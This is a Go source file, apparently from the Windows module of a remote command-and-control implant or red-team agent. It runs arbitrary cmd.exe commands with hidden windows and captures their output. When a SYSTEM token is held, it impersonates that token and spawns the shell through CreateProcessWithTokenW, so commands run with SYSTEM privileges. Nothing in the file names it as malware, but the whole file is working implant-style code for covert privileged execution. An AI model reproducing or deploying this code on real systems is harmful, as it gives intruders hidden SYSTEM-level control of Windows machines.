//go:build windows

package agent

import (
	"fmt"
	"os/exec"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var procCreateProcessWithTokenW2 = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessWithTokenW")

func makeShellCmd(cmd string) *exec.Cmd {
	c := exec.Command("cmd.exe")
	c.SysProcAttr = &windows.SysProcAttr{
		CmdLine:    `/S /C "` + cmd + `"`,
		HideWindow: true,
	}
	return c
}

// runShellSystemHook runs cmd as SYSTEM when gSystemToken is set.
// Uses direct Win32 calls (same pattern as the C agent) to avoid Go's
// exec layer, which relies on the process token for CreateProcessWithTokenW
// privilege checks in some codepaths.
func runShellSystemHook(cmd string) (out string, handled bool, err error) {
	if gSystemToken == 0 {
		return "", false, nil
	}
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	if r, _, e := procImpersonateLoggedOnUser.Call(uintptr(gSystemToken)); r == 0 {
		return fmt.Sprintf("[ImpersonateLoggedOnUser: %v]", e), true, nil
	}
	defer procRevertToSelf2.Call()

	return shellDirectAsSystem(cmd, windows.Handle(gSystemToken)), true, nil
}

// shellDirectAsSystem creates a cmd.exe process using the supplied primary token
// via raw Win32 calls, capturing stdout+stderr through a pipe.
func shellDirectAsSystem(cmd string, token windows.Handle) string {
	fullCmd := `cmd.exe /s /c "` + cmd + `" 2>&1`
	wcmd, _ := syscall.UTF16PtrFromString(fullCmd)

	sa := windows.SecurityAttributes{
		Length:        uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		InheritHandle: 1,
	}
	var hRead, hWrite windows.Handle
	if err := windows.CreatePipe(&hRead, &hWrite, &sa, 0); err != nil {
		return fmt.Sprintf("[CreatePipe: %v]", err)
	}
	_ = windows.SetHandleInformation(hRead, windows.HANDLE_FLAG_INHERIT, 0)

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESTDHANDLES
	si.StdOutput = hWrite
	si.StdErr = hWrite
	// StdInput = 0 (NULL) — child does not need interactive stdin

	var pi windows.ProcessInformation
	r, _, e := procCreateProcessWithTokenW2.Call(
		uintptr(token),
		0,                             // dwLogonFlags = 0
		0,                             // lpApplicationName = NULL
		uintptr(unsafe.Pointer(wcmd)), // lpCommandLine
		0x08000000,                    // dwCreationFlags = CREATE_NO_WINDOW
		0, 0,                          // lpEnvironment, lpCurrentDirectory = NULL
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	_ = windows.CloseHandle(hWrite)
	if r == 0 {
		_ = windows.CloseHandle(hRead)
		return fmt.Sprintf("[CreateProcessWithTokenW: %v]", e)
	}

	var buf []byte
	tmp := make([]byte, 512)
	var nr uint32
	for {
		readErr := windows.ReadFile(hRead, tmp, &nr, nil)
		if nr > 0 {
			buf = append(buf, tmp[:nr]...)
		}
		if readErr != nil {
			break
		}
	}
	_, _ = windows.WaitForSingleObject(pi.Process, 60000)
	_ = windows.CloseHandle(hRead)
	_ = windows.CloseHandle(pi.Process)
	_ = windows.CloseHandle(pi.Thread)
	return string(buf)
}
